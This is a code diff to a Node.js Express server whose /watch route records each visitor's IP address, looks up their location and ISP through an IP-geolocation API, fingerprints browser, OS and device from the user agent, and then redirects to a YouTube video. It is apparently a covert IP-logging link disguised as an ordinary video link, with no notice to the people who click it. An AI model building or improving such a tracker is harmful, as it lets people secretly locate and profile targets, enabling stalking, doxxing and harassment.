@@ -1,6 +1,7 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
+const useragent = require('useragent');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -30,37 +31,52 @@ app.get('/watch', async (req, res) => {
         
         // Get real IP and clean it
         let ip = req.realIp.replace('::ffff:', '');
-        // Extract first IP if multiple are present (from proxy chain)
         ip = ip.split(',')[0].trim();
         
         console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);
 
-        // Pour les tests locaux, utilisons une IP publique fictive
+        // Parse user agent
+        const agent = useragent.parse(req.headers['user-agent']);
+        const deviceInfo = {
+            browser: agent.family,
+            browserVersion: agent.toVersion(),
+            os: agent.os.toString(),
+            device: agent.device.family,
+            isMobile: agent.device.family !== 'Other',
+            isBot: agent.isBot
+        };
+
+        console.log('\x1b[36m%s\x1b[0m', `Device info: ${JSON.stringify(deviceInfo)}`);
+
+        // Pour les tests locaux
         if (ip === '::1' || ip === '127.0.0.1') {
             ip = '8.8.8.8';
             console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
         }
 
         try {
-            // Get IP info with cleaned IP
             const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
             
             if (ipInfo.data.status === 'success') {
                 console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
                 
-                // Store in memory
+                // Store in memory with device info
                 trackedIPs.push({
                     ip: ip,
                     country: ipInfo.data.country,
                     city: ipInfo.data.city,
                     latitude: ipInfo.data.lat,
                     longitude: ipInfo.data.lon,
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    deviceInfo: deviceInfo,
+                    isp: ipInfo.data.isp,
+                    org: ipInfo.data.org,
+                    as: ipInfo.data.as,
+                    timezone: ipInfo.data.timezone
                 });
 
                 console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);
 
-                // Keep only last 100 IPs to manage memory
                 if (trackedIPs.length > 100) {
                     trackedIPs = trackedIPs.slice(-100);
                 }
@@ -71,7 +87,6 @@ app.get('/watch', async (req, res) => {
             console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
         }
 
-        // Redirect to actual YouTube video
         if (videoId) {
             res.redirect(`https://youtube.com/watch?v=${videoId}`);
         } else {
